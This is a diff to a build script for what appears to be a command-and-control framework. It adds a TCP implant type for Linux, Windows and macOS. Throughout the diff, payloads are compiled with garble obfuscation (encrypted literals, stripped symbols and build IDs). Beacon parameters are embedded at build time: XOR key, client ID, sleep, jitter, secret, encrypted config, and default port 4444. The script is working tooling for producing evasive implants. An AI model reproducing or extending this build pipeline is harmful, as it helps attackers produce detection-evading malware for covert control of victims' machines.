@@ -5,19 +5,35 @@ set -e  # Exit on error
 if [ "$EXPORT_PROJECT" = "TRUE" ]; then
     echo "=== Project Export Mode ==="
     echo "OS: ${OS}"
+    echo "PAYLOAD_TYPE: ${PAYLOAD_TYPE:-http}"
     echo "PROJECT_ID: ${PROJECT_ID}"
     echo "OUTPUT_FILENAME: ${OUTPUT_FILENAME}"
-    
-    # Determine source directory
+
+    # Determine source directory based on OS and payload type
+    payload_type=${PAYLOAD_TYPE:-http}
     case "${OS}" in
         "linux")
-            source_dir="Linux"
+            if [ "$payload_type" = "tcp" ]; then
+                source_dir="TCP_Linux"
+            else
+                source_dir="Linux"
+            fi
             ;;
         "windows")
-            source_dir="Windows"
+            if [ "$payload_type" = "smb" ]; then
+                source_dir="SMB_Windows"
+            elif [ "$payload_type" = "tcp" ]; then
+                source_dir="TCP_Windows"
+            else
+                source_dir="Windows"
+            fi
             ;;
         "darwin")
-            source_dir="Darwin"
+            if [ "$payload_type" = "tcp" ]; then
+                source_dir="TCP_Darwin"
+            else
+                source_dir="Darwin"
+            fi
             ;;
         *)
             echo "Error: Unknown OS ${OS}"
@@ -83,18 +99,30 @@ setup_build_dir() {
 
     case "${build_os}" in
         "linux")
-            source_dir="Linux"
+            # Check if this is a TCP payload
+            if [ "$payload_type" = "tcp" ]; then
+                source_dir="TCP_Linux"
+            else
+                source_dir="Linux"
+            fi
             ;;
         "windows" | "win")
-            # Check if this is an SMB payload
+            # Check if this is an SMB or TCP payload
             if [ "$payload_type" = "smb" ]; then
                 source_dir="SMB_Windows"
+            elif [ "$payload_type" = "tcp" ]; then
+                source_dir="TCP_Windows"
             else
                 source_dir="Windows"
             fi
             ;;
         "darwin")
-            source_dir="Darwin"
+            # Check if this is a TCP payload
+            if [ "$payload_type" = "tcp" ]; then
+                source_dir="TCP_Darwin"
+            else
+                source_dir="Darwin"
+            fi
             ;;
         *)
             echo "Error: Unknown OS ${build_os}"
@@ -210,10 +238,26 @@ build_binary() {
         fi
     fi
 
+    # Build TCP-specific flags if this is a TCP payload
+    TCP_FLAGS=""
+    if [ "${PAYLOAD_TYPE}" = "tcp" ]; then
+        echo "[*] Building TCP payload on port: ${TCP_PORT:-4444}"
+        TCP_FLAGS="-X 'main.tcpPort=${TCP_PORT:-4444}'"
+        # Add encrypted config (contains TCP Port, Secret, Public Key)
+        if [ ! -z "${ENCRYPTED_CONFIG}" ]; then
+            TCP_FLAGS="${TCP_FLAGS} -X 'main.encryptedConfig=${ENCRYPTED_CONFIG}'"
+        fi
+        # Add TCP transform profile if configured
+        if [ ! -z "${TCP_DATA_TRANSFORMS}" ]; then
+            echo "[*] TCP data transforms configured"
+            TCP_FLAGS="${TCP_FLAGS} -X 'main.tcpDataTransforms=${TCP_DATA_TRANSFORMS}'"
+        fi
+    fi
+
     # Run garble build with all flags including safety checks
     cd /app
 
-    # Use different ldflags for SMB vs HTTP payloads
+    # Use different ldflags for SMB, TCP, and HTTP payloads
     if [ "${PAYLOAD_TYPE}" = "smb" ]; then
         # SMB payload - uses xorKey for runtime decryption (same security as HTTPS)
         GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
@@ -225,6 +269,18 @@ build_binary() {
             -X 'main.secret=${SECRET}' \
             -X 'main.encryptedConfig=${ENCRYPTED_CONFIG}' \
             ${SMB_FLAGS} \
+            ${SAFETY_FLAGS}" \
+            -trimpath -o "/output/${OUTPUT_FILENAME}"
+    elif [ "${PAYLOAD_TYPE}" = "tcp" ]; then
+        # TCP payload - uses xorKey for runtime decryption, similar to SMB
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
+            -ldflags "-w -s -buildid= \
+            -X 'main.xorKey=${XOR_KEY}' \
+            -X 'main.clientID=${CLIENTID}' \
+            -X 'main.sleep=${SLEEP}' \
+            -X 'main.jitter=${JITTER}' \
+            -X 'main.secret=${SECRET}' \
+            ${TCP_FLAGS} \
             ${SAFETY_FLAGS}" \
             -trimpath -o "/output/${OUTPUT_FILENAME}"
     else
